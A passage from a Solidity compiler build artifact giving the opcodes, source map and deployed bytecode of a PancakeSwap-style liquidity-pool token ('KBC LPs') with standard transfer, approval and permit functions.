NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x622 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x658 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x6A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x6B4 DUP10 DUP10 DUP10 PUSH2 0x6DC JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7B7 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7EC SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x848 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 STOP 0xD3 LOG0 PUSH19 0xE2B19D1942FD6FF86893A1396BBA021B0FB095 DUP12 0xE6 SELFDESTRUCT GASPRICE LT 0xDA 0x49 0xB7 0xD4 PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN GASLIMIT 0x49 POP CALLDATACOPY BALANCE ORIGIN DIFFICULTY PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 ",
							"sourceMap": "111:4330:0:-;;;1017:485;8:9:-1;5:2;;;30:1;27;20:12;5:2;-1:-1;1203:133:0;;1107:7;;1203:133;;;;;;;;;;;;;;;;1370:4;;;;;;;;-1:-1:-1;;;1370:4:0;;;;;1404:10;;;;;;;;;;-1:-1:-1;;;1404:10:0;;;;1175:310;;;;;;;;;1354:22;1175:310;;;;1394:21;1175:310;;;;;;;;;;;1466:4;1175:310;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;1175:310:0;;;;;;1152:343;;;;;;;;1133:16;:362;-1:-1:-1;111:4330:0;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100ea5760003560e01c806347d5d8561161008c57806395d89b411161006657806395d89b411461029c578063a9059cbb146102a4578063d505accf146102d0578063dd62ed3e14610323576100ea565b806347d5d8561461022a57806370a08231146102505780637ecebe0014610276576100ea565b806323b872dd116100c857806323b872dd146101c657806330adf81f146101fc578063313ce567146102045780633644e51514610222576100ea565b806306fdde03146100ef578063095ea7b31461016c57806318160ddd146101ac575b600080fd5b6100f7610351565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b038135169060200135610374565b604080519115158252519081900360200190f35b6101b461038b565b60408051918252519081900360200190f35b610198600480360360608110156101dc57600080fd5b506001600160a01b03813581169160208101359091169060400135610391565b6101b461042b565b61020c61044f565b6040805160ff9092168252519081900360200190f35b6101b4610454565b6101b46004803603602081101561024057600080fd5b50356001600160a01b031661045a565b6101b46004803603602081101561026657600080fd5b50356001600160a01b031661046c565b6101b46004803603602081101561028c57600080fd5b50356001600160a01b031661047e565b6100f7610490565b610198600480360360408110156102ba57600080fd5b506001600160a01b0381351690602001356104b2565b610321600480360360e08110156102e657600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356104bf565b005b6101b46004803603604081101561033957600080fd5b506001600160a01b03813581169160200135166106bf565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b60006103813384846106dc565b5060015b92915050565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610416576001600160a01b03841660009081526002602090815260408083203384529091529020546103f1908363ffffffff61073e16565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b61042184848461078e565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b60016020526000908152604090205481565b60056020526000908152604090205481565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b600061038133848461078e565b42841015610507576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa158015610622573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906106585750886001600160a01b0316816001600160a01b0316145b6106a9576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b6106b48989896106dc565b505050505050505050565b600260209081526000928352604080842090915290825290205481565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b80820382811115610385576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160a01b0383166000908152600160205260409020546107b7908263ffffffff61073e16565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546107ec908263ffffffff61084816565b6001600160a01b0380841660008181526001602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b80820182811015610385576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfea265627a7a7231582000d3a072e2b19d1942fd6ff86893a1396bba021b0fb0958be6ff3a10da49b7d464736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xEA JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x47D5D856 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x95D89B41 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x29C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2A4 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x2D0 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x323 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x22A JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x276 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xC8 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1C6 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x1FC JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x222 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF7 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x131 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x15E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x38B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x391 JUMP JUMPDEST PUSH2 0x1B4 PUSH2 0x42B JUMP JUMPDEST PUSH2 0x20C PUSH2 0x44F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x454 JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x45A JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x46C JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x47E JUMP JUMPDEST PUSH2 0xF7 PUSH2 0x490 JUMP JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x321 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x4BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x6DC JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0x416 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x3F1 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0x421 DUP5 DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x507 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x622 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x658 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x6A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x6B4 DUP10 DUP10 DUP10 PUSH2 0x6DC JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7B7 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7EC SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x848 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 STOP 0xD3 LOG0 PUSH19 0xE2B19D1942FD6FF86893A1396BBA021B0FB095 DUP12 0xE6 SELFDESTRUCT GASPRICE LT 0xDA 0x49 0xB7 0xD4 PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN ",
